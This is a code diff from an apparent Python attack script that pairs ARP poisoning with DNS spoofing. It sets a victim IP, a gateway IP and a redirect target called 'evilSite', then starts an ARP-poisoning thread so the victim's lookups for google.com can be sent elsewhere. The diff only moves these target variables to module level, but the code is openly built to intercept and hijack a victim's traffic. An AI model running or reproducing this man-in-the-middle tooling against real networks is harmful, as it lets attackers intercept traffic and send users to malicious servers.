@@ -8,6 +8,11 @@ import ArpPoison
 #     dns_packet2 = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.google.com'))
 #     # dns_packet2.show()
 #     send(dns_packet2)
+
+ipVictim = '192.168.178.144' # The IP address of the victim
+ipServer = '192.168.178.1' # The IP address of the gateway
+goodSite = 'google.com' # The website we want to redirect them from
+evilSite = '188.114.96.0' # The IP address we want to redirect the victim to
     
 def dns_packet_filter(packet):
     if DNS in packet: 
@@ -48,10 +53,6 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     
 def main() :
     pktCounter = 0
-    ipVictim = '192.168.178.144' # The IP address of the victim
-    ipServer = '192.168.178.1' # The IP address of the gateway
-    goodSite = 'google.com' # The website we want to redirect them from
-    evilSite = '188.114.96.0' # The IP address we want to redirect the victim to
     arpThread = Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
     arpThread.start()
     while True: 
